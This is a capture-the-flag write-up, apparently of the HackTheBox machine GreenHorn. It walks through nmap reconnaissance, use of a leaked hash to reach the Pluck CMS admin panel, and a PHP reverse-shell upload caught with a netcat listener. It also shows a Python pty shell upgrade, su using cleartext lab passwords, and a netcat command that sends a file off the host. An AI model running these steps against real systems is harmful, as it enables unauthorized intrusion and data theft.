As usual, I start by scanning the target machine with nmap, we see only two open ports

<pre><code>> sudo nmap -p80,22 -sCV -Pn 10.10.11.25 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-10 23:25 -03
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: pluck 4.7.18
| http-title: Welcome to GreenHorn ! - GreenHorn
|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds</code></pre>

if we try to access the page, we will not be able to

In many CTF scenarios, access to a service or web page that is hosted on a remote machine is required. In real network environments, IP addresses are associated with domain names via DNS servers, but in CTF environments, there is not always a DNS server that resolves the hostname.
For this reason, you need to manually add that in your /etc/hosts file.

<pre><code>~> echo "10.10.11.25 greenhorn.htb" | sudo tee -a /etc/hosts</code></pre>

once we are on the page the first thing I saw was a login, after a long time (more than I would like to admit) trying to breach it and thinking that the purpose of the machine was that I finally gave up and went back to do the reconnaissance to check if I missed anything.

![1](https://github.com/user-attachments/assets/b2fdb538-9fac-4aec-96ae-4f8fb2d34024)



![2](https://github.com/user-attachments/assets/f18c2462-5bac-4cd6-90c9-622ecd6aeeb0)

I had to rescan the machine with nmap to see that port 3000 was open.
<pre><code>Discovered open port 3000/tcp on 10.10.11.25</code></pre>

now with this new information I have accessed the site again but this time from port 3000.

![5](https://github.com/user-attachments/assets/aa2c5d34-6d7d-4b0c-81be-16f498f08a45)

with gobuster I found this repository

![6](https://github.com/user-attachments/assets/74013583-4a85-41c6-80e5-fd41f75dfe45)

after looking through most of the files in the repository I found this hash 

![8](https://github.com/user-attachments/assets/5242ad32-0829-44c7-89d7-b744d0d18a17)

using hash-identifier I was able to know what kind of hash I was dealing with

<pre><code>> hash-identifier 
/usr/bin/hash-identifier:13: SyntaxWarning: invalid escape sequence '\ '
  logo='''   #########################################################################
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
 HASH: </code></pre>


if we decrypt the hash we get the a password

the first thing I did was to go to the login that I previously could not break and test if the password worked. and it did
![9](https://github.com/user-attachments/assets/958e53de-f096-444e-ac03-0ca04b592e89)

and we can see the administration interface of “Pluck”, a content management system.

![10](https://github.com/user-attachments/assets/7d1c8a0a-3b52-4fd4-8eb0-2ed65a46ea7c)
Malicious file upload is one of the most common vulnerabilities in CMS. This problem occurs when an attacker can upload malicious files to the server due to a lack of proper validation or filtering of the uploaded files.

Many CMSs allow administrators to upload plugins or modules to add new functionality. If these plugins are not properly designed, they can allow users to upload files of any type to the server.

and that is what we are going to do
![2](https://github.com/user-attachments/assets/b2fa9e4d-9bce-453f-8a91-134fd56680ae)

for this particular case what I had to do was to use a php reverse shell created by pentestmonkey and save it inside a .zip file
https://github.com/pentestmonkey/php-reverse-shell

and before uploading I start netcat 

<pre><code>> sudo nc -lvnp 3333</code></pre>

and we are in

<pre><code>Connection from 10.10.11.25:60296
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 03:46:01 up 17:45,  0 users,  load average: 0.00, 0.09, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ </code></pre>

I went to look for the user flag but I had no privileges.
<pre><code>$ cd /home/
$ ls
git
junior
$ cd junior
$ ls
Using OpenVAS.pdf
user.txt
$ cat user.txt
cat: user.txt: Permission denied</code></pre>


This command uses Python to invoke a Bash TTY shell, so we can work better
<pre><code>$ python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>

I tried to put the credential we got previously with that hash and it worked, but only for the user Junior, I still had to escalate privileges.

<pre><code>www-data@greenhorn:/home/junior$ su junior
su junior
Password: iloveyou1

junior@greenhorn:~$ </code></pre>

<pre><code>junior@greenhorn:~$ cat user.txt
cat user.txt
????????????????????????</code></pre>

inside this pdf is the root password, the password is blurred and is a headache to get.

<pre><code>junior@greenhorn:~$ nc 10.10.11.25 1234 < 'Using OpenVAS.pdf'        
nc 10.10.11.25 1234 < 'Using OpenVAS.pdf'</code></pre>

<pre><code>~> nc -nlvp 1234 >  'Using OpenVAS.pdf'</code></pre>



<pre><code>junior@greenhorn:~$ su root
su root
Password: sidefromsidetheothersidesidefromsidetheotherside
</code></pre>

<pre><code>root@greenhorn:~# cat root.txt
cat root.txt
???????????</code></pre>

![2024-09-11_01-02](https://github.com/user-attachments/assets/8eab8df5-38ca-4c16-9261-bf0d1e0baabe)

